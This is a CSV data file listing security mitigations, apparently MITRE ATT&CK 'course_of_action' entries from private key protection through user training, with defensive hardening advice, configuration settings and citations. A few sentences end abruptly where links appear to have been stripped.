Private Keys Mitigation,"Use strong passphrases for private keys to make cracking difficult. When possible, store keys on separate cryptographic hardware instead of on the local system. Ensure only authorized keys are allowed access to critical resources and audit access lists regularly. Ensure permissions are properly set on folders containing sensitive private keys to prevent unintended access. Use separate infrastructure for managing critical systems to prevent overlap of credentials and permissions on systems that could be used as vectors for lateral movement. Follow other best practices for mitigating access through use of .",course_of_action
Privileged Account Management,"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.",course_of_action
Privileged Process Integrity,"Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.",course_of_action
Process Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Process Doppelgänging Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls or patched since it is based on the abuse of operating system design features. For example, mitigating specific API calls will likely have unintended side effects, such as preventing legitimate process-loading mechanisms from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior.

Although Process Doppelgänging may be used to evade certain types of defenses, it is still good practice to identify potentially malicious software that may be used to perform adversarial actions and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Process Hollowing Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of operating system design features. For example, mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software (i.e., security products) from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. 

Although process hollowing may be used to evade certain types of defenses, it is still good practice to identify potentially malicious software that may be used to perform adversarial actions and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Query Registry Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Rc.common Mitigation,Limit privileges of user accounts so only authorized users can edit the rc.common file.,course_of_action
Re-opened Applications Mitigation,Holding the Shift key while logging in prevents apps from opening automatically (Citation: Re-Open windows on Mac). This feature can be disabled entirely with the following terminal command: <code>defaults write -g ApplePersistence -bool no</code>.,course_of_action
Redundant Access Mitigation,"Identify and block potentially malicious software that may be used as a remote access tool, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Registry Run Keys / Startup Folder Mitigation,Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP),course_of_action
Regsvcs/Regasm Mitigation,Regsvcs and Regasm may not be necessary within a given environment. Block execution of Regsvcs.exe and Regasm.exe if they are not required for a given system or network to prevent potential misuse by adversaries.,course_of_action
Regsvr32 Mitigation,Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass whitelisting. (Citation: Secure Host Baseline EMET),course_of_action
Remote Access Tools Mitigation,"Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access tools.

Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to these services as well.

Use application whitelisting to mitigate use of and installation of unapproved software.",course_of_action
Remote Data Storage,Use remote security log and sensitive file storage where access can be controlled better to prevent exposure of intrusion detection log data or sensitive information.,course_of_action
Remote Desktop Protocol Mitigation,"Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins. (Citation: Berkley Secure) Do not leave RDP accessible from the internet. Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server. (Citation: Windows RDP Sessions)",course_of_action
Remote File Copy Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Remote System Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Replication Through Removable Media Mitigation,"Disable Autorun if it is unnecessary. (Citation: Microsoft Disable Autorun) Disallow or restrict removable media at an organizational policy level if it is not required for business operations. (Citation: TechNet Removable Media Control)

Identify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Resource Hijacking Mitigation,"Identify potentially malicious software and audit and/or block it by using whitelisting(Citation: Beechey 2010) tools, like AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA MS AppLocker) or Software Restriction Policies(Citation: Corio 2008) where appropriate.(Citation: TechNet Applocker vs SRP)",course_of_action
Restrict File and Directory Permissions,Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.,course_of_action
Restrict Library Loading,Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.,course_of_action
Restrict Registry Permissions,Restrict the ability to modify certain hives or keys in the Windows Registry.,course_of_action
Restrict Web-Based Content,"Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.",course_of_action
Rootkit Mitigation,"Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Rundll32 Mitigation,Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting. (Citation: Secure Host Baseline EMET),course_of_action
Runtime Data Manipulation Mitigation,"Identify critical business and system processes that may be targeted by adversaries and work to secure those systems against tampering. Prevent critical business and system processes from being replaced, overwritten, or reconfigured to load potentially malicious code. Identify potentially malicious software and audit and/or block it by using whitelisting(Citation: Beechey 2010) tools, like AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA MS AppLocker) or Software Restriction Policies(Citation: Corio 2008) where appropriate.(Citation: TechNet Applocker vs SRP)",course_of_action
SID-History Injection Mitigation,"Clean up SID-History attributes after legitimate account migration is complete.

Consider applying SID Filtering to interforest trusts, such as forest trusts and external trusts, to exclude SID-History from requests to access domain resources. SID Filtering ensures that any authentication requests over a trust only contain SIDs of security principals from the trusted domain (i.e. preventing the trusted domain from claiming a user has membership in groups outside of the domain).

SID Filtering of forest trusts is enabled by default, but may have been disabled in some cases to allow a child domain to transitively access forest trusts. SID Filtering of external trusts is automatically enabled on all created external trusts using Server 2003 or later domain controllers. (Citation: Microsoft Trust Considerations Nov 2014) (Citation: Microsoft SID Filtering Quarantining Jan 2009) However note that SID Filtering is not automatically applied to legacy trusts or may have been deliberately disabled to allow inter-domain access to resources.

SID Filtering can be applied by: (Citation: Microsoft Netdom Trust Sept 2012)

* Disabling SIDHistory on forest trusts using the netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /EnableSIDHistory:no</code> on the domain controller). 
* Applying SID Filter Quarantining to external trusts using the netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /quarantine:yes</code> on the domain controller)
Applying SID Filtering to domain trusts within a single forest is not recommended as it is an unsupported configuration and can cause breaking changes. (Citation: Microsoft Netdom Trust Sept 2012) (Citation: AdSecurity Kerberos GT Aug 2015) If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust.",course_of_action
SIP and Trust Provider Hijacking Mitigation,"Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Also ensure that these values contain their full path to prevent . (Citation: SpectorOps Subverting Trust Sept 2017)

Consider removing unnecessary and/or stale SIPs. (Citation: SpectorOps Subverting Trust Sept 2017)

Restrict storage and execution of SIP DLLs to protected directories, such as C:\Windows, rather than user directories.

Enable whitelisting solutions such as AppLocker and/or Device Guard to block the loading of malicious SIP DLLs. Components may still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented.",course_of_action
SSH Hijacking Mitigation,Ensure SSH key pairs have strong passwords and refrain from using key-store technologies such as ssh-agent unless they are properly protected. Ensure that all private keys are stored securely in locations where only the legitimate owner has access to with strong passwords and are rotated frequently. Ensure proper file permissions are set and harden system to prevent root privilege escalation opportunities. Do not allow remote access via SSH as root or other privileged accounts. Ensure that agent forwarding is disabled on systems that do not explicitly require this feature to prevent misuse. (Citation: Symantec SSH and ssh-agent),course_of_action
SSL/TLS Inspection,Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.,course_of_action
Scheduled Task Mitigation,"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. (Citation: Powersploit)

Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. (Citation: TechNet Server Operator Scheduled Task)

Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)

Identify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Scheduled Transfer Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Screen Capture Mitigation,"Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Screensaver Mitigation,Block .scr files from being executed from non-standard locations. Set Group Policy to force users to have a dedicated screensaver where local changes should not override the settings to prevent changes. Use Group Policy to disable screensavers if they are unnecessary. (Citation: TechNet Screensaver GP),course_of_action
Scripting Mitigation,"Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.

Configure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. (Citation: Microsoft Block Office Macros) Other types of virtualization and application microsegmentation may also mitigate the impact of compromise. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)",course_of_action
Security Software Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Security Support Provider Mitigation,"Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)",course_of_action
Service Execution Mitigation,"Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.

Identify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Service Registry Permissions Weakness Mitigation,"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.

Identify and block potentially malicious software that may be executed through service abuse by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown programs.",course_of_action
Service Stop Mitigation,"Ensure proper process, registry, and file permissions are in place to inhibit adversaries from disabling or interfering with critical services. Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. Harden systems used to serve critical network, business, and communications functions. Operate intrusion detection, analysis, and response systems on a separate network from the production environment to lessen the chances that an adversary can see and interfere with critical response functions.",course_of_action
Setuid and Setgid Mitigation,"Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system.",course_of_action
Shared Webroot Mitigation,"Networks that allow for open development and testing of Web content and allow users to set up their own Web servers on the enterprise network may be particularly vulnerable if the systems and Web servers are not properly secured to limit privileged account use, unauthenticated network share access, and network/system isolation.

Ensure proper permissions on directories that are accessible through a Web server. Disallow remote access to the webroot or other directories used to serve Web content. Disable execution on directories within the webroot. Ensure that permissions of the Web server process are only what is required by not using built-in accounts; instead, create specific accounts to limit unnecessary access or permissions overlap across multiple systems. (Citation: acunetix Server Secuirty) (Citation: NIST Server Security July 2008)",course_of_action
Shortcut Modification Mitigation,"Limit permissions for who can create symbolic links in Windows to appropriate groups such as Administrators and necessary groups for virtualization. This can be done through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links. (Citation: UCF STIG Symbolic Links)

Identify and block unknown, potentially malicious software that may be executed through shortcut modification by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Signed Script Proxy Execution Mitigation,Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application whitelisting configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.,course_of_action
Software Configuration,Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.,course_of_action
Software Packing Mitigation,"Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.

Identify and prevent execution of potentially malicious software that may have been packed by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Source Mitigation,"Due to potential legitimate uses of source commands, it's may be difficult to mitigate use of this technique.",course_of_action
Space after Filename Mitigation,Prevent files from having a trailing space after the extension.,course_of_action
Spearphishing Attachment Mitigation,"Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in .

Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails. To prevent the attachments from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.",course_of_action
Spearphishing Link Mitigation,"Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk. Other mitigations can take place as  occurs.",course_of_action
Spearphishing via Service Mitigation,"Determine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.

Because this technique involves use of legitimate services and user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails with malicious links. To prevent the downloads from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.",course_of_action
Standard Cryptographic Protocol Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often. (Citation: University of Birmingham C2)",course_of_action
Standard Non-Application Layer Protocol Mitigation,"Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Startup Items Mitigation,"Since StartupItems are deprecated, preventing all users from writing to the <code>/Library/StartupItems</code> directory would prevent any startup items from getting registered. Similarly, appropriate permissions should be applied such that only specific users can edit the startup items so that they can’t be leveraged for privilege escalation.",course_of_action
Stored Data Manipulation Mitigation,"Identify critical business and system processes that may be targeted by adversaries and work to secure the data related to those processes against tampering. Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk. Consider encrypting important information to reduce an adversaries ability to perform tailor data modifications. Where applicable, examine using file monitoring software to check integrity on important files and directories as well as take corrective actions when unauthorized changes are detected. 

Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.(Citation: Ready.gov IT DRP) Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and manipulate backups.",course_of_action
Sudo Caching Mitigation,"Setting the <code>timestamp_timeout</code> to 0 will require the user to input their password every time <code>sudo</code> is executed. Similarly, ensuring that the <code>tty_tickets</code> setting is enabled will prevent this leakage across tty sessions.",course_of_action
Sudo Mitigation,"The sudoers file should be strictly edited such that passwords are always required and that users can’t spawn risky processes as users with higher privilege. By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file.",course_of_action
Supply Chain Compromise Mitigation,"Apply supply chain risk management (SCRM) practices and procedures (Citation: MITRE SE Guide 2014), such as supply chain analysis and appropriate risk management, throughout the life-cycle of a system.

Leverage established software development lifecycle (SDLC) practices (Citation: NIST Supply Chain 2012): 

* Uniquely Identify Supply Chain Elements, Processes, and Actors
* Limit Access and Exposure within the Supply Chain
* Establish and Maintain the Provenance of Elements, Processes, Tools, and Data
* Share Information within Strict Limits
* Perform SCRM Awareness and Training
* Use Defensive Design for Systems, Elements, and Processes
* Perform Continuous Integrator Review
* Strengthen Delivery Mechanisms
* Assure Sustainment Activities and Processes
* Manage Disposal and Final Disposition Activities throughout the System or Element Life Cycle

A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation. Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well. (Citation: OWASP Top 10 2017)",course_of_action
System Firmware Mitigation,Prevent adversary access to privileged accounts or access necessary to perform this technique. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. Patch the BIOS and EFI as necessary. Use Trusted Platform Module technology. (Citation: TCG Trusted Platform Module),course_of_action
System Information Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
System Network Configuration Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
System Network Connections Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
System Owner/User Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
System Service Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
System Time Discovery Mitigation,"Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.

Identify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Systemd Service Mitigation,"The creation and modification of systemd service unit files is generally reserved for administrators such as the Linux root user and other users with superuser privileges. Limit user access to system utilities such as systemctl to only users who have a legitimate need. Restrict read/write access to systemd unit files to only select privileged users who have a legitimate need to manage system services. Additionally, the installation of software commonly adds and changes systemd service unit files. Restrict software installation to trusted repositories only and be cautious of orphaned software packages. Utilize malicious code protection and application whitelisting to mitigate the ability of malware to create or modify systemd services. ",course_of_action
Taint Shared Content Mitigation,"Protect shared folders by minimizing users who have write access. Use utilities that detect or mitigate common features used in exploitation, such as the Microsoft Enhanced Mitigation Experience Toolkit (EMET).

Reduce potential lateral movement risk by using web-based document management and collaboration services that do not use network file and directory sharing.

Identify potentially malicious software that may be used to taint content or may result from it and audit and/or block the unknown programs by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Template Injection Mitigation,"Consider disabling Microsoft Office macros/active content to prevent the execution of malicious payloads in documents (Citation: Microsoft Disable Macros), though this setting may not mitigate the  use for this technique.

Because this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations including training users to identify social engineering techniques and spearphishing emails. Network/Host intrusion prevention systems, antivirus, and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads. (Citation: Anomali Template Injection MAR 2018)",course_of_action
Third-party Software Mitigation,"Evaluate the security of third-party software that could be used in the enterprise environment. Ensure that access to management systems for third-party systems is limited, monitored, and secure. Have a strict approval policy for use of third-party systems.

Grant access to Third-party systems only to a limited number of authorized administrators. Ensure proper system and access isolation for critical network systems through use of firewalls, account privilege separation, group policy, and multi-factor authentication. Verify that account credentials that may be used to access third-party systems are unique and not used throughout the enterprise network. Ensure that any accounts used by third-party providers to access these systems are traceable to the third-party and are not used throughout the network or used by other third-party providers in the same environment. Ensure third-party systems are regularly patched by users or the provider to prevent potential remote access through . 

Ensure there are regular reviews of accounts provisioned to these systems to verify continued business need, and ensure there is governance to trace de-provisioning of access that is no longer required.

Where the third-party system is used for deployment services, ensure that it can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the third-party system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.",course_of_action
Threat Intelligence Program,A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.,course_of_action
Time Providers Mitigation,"Identify and block potentially malicious software that may be executed as a time provider by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown DLLs.

Consider using Group Policy to configure and block subsequent modifications to W32Time parameters. (Citation: Microsoft W32Time May 2017)",course_of_action
Timestomp Mitigation,Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP),course_of_action
Transmitted Data Manipulation Mitigation,Identify critical business and system processes that may be targeted by adversaries and work to secure communications related to those processes against tampering. Encrypt all important data flows to reduce the impact of tailored modifications on data in transit.,course_of_action
Trap Mitigation,"Due to potential legitimate uses of trap commands, it's may be difficult to mitigate use of this technique.",course_of_action
Trusted Relationship Mitigation,Network segmentation can be used to isolate infrastructure components that do not require broad network access. Properly manage accounts and permissions used by parties in trusted relationships to minimize potential abuse by the party and if the party is compromised by an adversary. Vet the security policies and procedures of organizations that are contracted for work that require privileged access to network resources.,course_of_action
Two-Factor Authentication Interception Mitigation,"Remove smart cards when not in use. Protect devices and services used to transmit and receive out-of-band codes.

Identify and block potentially malicious software that may be used to intercept 2FA credentials on a system by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Uncommonly Used Port Mitigation,"Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. 

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Update Software,Perform regular software updates to mitigate exploitation risk.,course_of_action
User Account Control,Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access.,course_of_action
User Account Management,"Manage the creation, modification, use, and permissions associated to user accounts.",course_of_action
User Execution Mitigation,"Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events. Application whitelisting may be able to prevent the running of executables masquerading as other files.

If a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .lnk, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and RAR that may be used to conceal malicious files in .

If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct files in a way to avoid these systems.",course_of_action
User Training,"Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.",course_of_action
